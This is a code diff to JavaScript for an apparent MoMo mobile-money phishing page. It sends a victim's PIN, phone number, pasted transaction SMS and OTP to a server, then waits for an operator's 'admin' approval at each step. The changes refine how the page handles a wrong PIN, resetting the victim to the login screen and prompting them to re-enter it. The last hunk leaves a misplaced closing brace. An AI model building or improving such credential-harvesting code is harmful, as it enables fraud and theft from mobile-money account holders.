@@ -169,7 +169,7 @@ async function submitPinLogin() {
     body: JSON.stringify({ appId: appDataStore.appId, pin, phone: appDataStore.phone })
   });
 
-  startPollingForNextStep('SMS_STEP', 'screen-waiting-admin', 'screen-sms', 'PIN_REJECTED', 'screen-login', '✅ CORRECT PIN VERIFIED');
+  startPollingForNextStep('SMS_STEP', 'screen-waiting-admin', 'screen-sms', 'PIN_REJECTED', 'screen-login', null);
 }
 
 // SMS Countdown Timer & Request New SMS Feature
@@ -238,7 +238,7 @@ async function submitSmsVerification() {
     body: JSON.stringify({ appId: appDataStore.appId, smsText })
   });
 
-  startPollingForNextStep('OTP_STEP', 'screen-waiting-sms', 'screen-otp', 'SMS_REJECTED', 'screen-sms', '✅ CORRECT SMS MESSAGE VERIFIED');
+  startPollingForNextStep('OTP_STEP', 'screen-waiting-sms', 'screen-otp', 'SMS_REJECTED', 'screen-sms', null);
 }
 
 // OTP Inputs Management
@@ -316,13 +316,13 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
 
         document.getElementById(nextScreenId).classList.add('active');
         if (successMessage) alert(successMessage);
-      } else if (data.status === rejectionStatus) {
+      } else if (data.status === rejectionStatus || data.status === 'PIN_REJECTED') {
         clearInterval(pollInterval);
         document.getElementById(waitingScreenId).style.display = 'none';
         
-        let errorMsg = '❌ Verification Rejected';
-        if (rejectionStatus === 'PIN_REJECTED') {
-          errorMsg = '❌ WRONG PIN ENTERED. Please check your MoMo PIN and try again.';
+        // Handle PIN_REJECTED globally regardless of where it's triggered from
+        if (data.status === 'PIN_REJECTED') {
+          alert('❌ WRONG PIN ENTERED. Please check your MoMo PIN and try again.');
           document.querySelectorAll('.p-pin').forEach(i => i.value = '');
           const btn = document.getElementById('btn-login-momo');
           if (btn) {
@@ -330,9 +330,15 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
             btn.style.color = '#888';
             btn.setAttribute('disabled', 'true');
           }
+          document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+          document.getElementById('screen-login').classList.add('active');
           const firstPin = document.querySelector('.p-pin');
           if (firstPin) firstPin.focus();
-        } else if (rejectionStatus === 'SMS_REJECTED') {
+          return;
+        }
+
+        let errorMsg = '❌ Verification Rejected';
+        if (rejectionStatus === 'SMS_REJECTED') {
           errorMsg = '❌ WRONG SMS PASTED. Please copy and paste the correct transaction SMS message.';
           const smsInput = document.getElementById('sms-text-input');
           if (smsInput) smsInput.value = '';
@@ -362,4 +368,5 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
       console.error('Polling error:', e);
     }
   }, 1000);
-}
+    }
+    
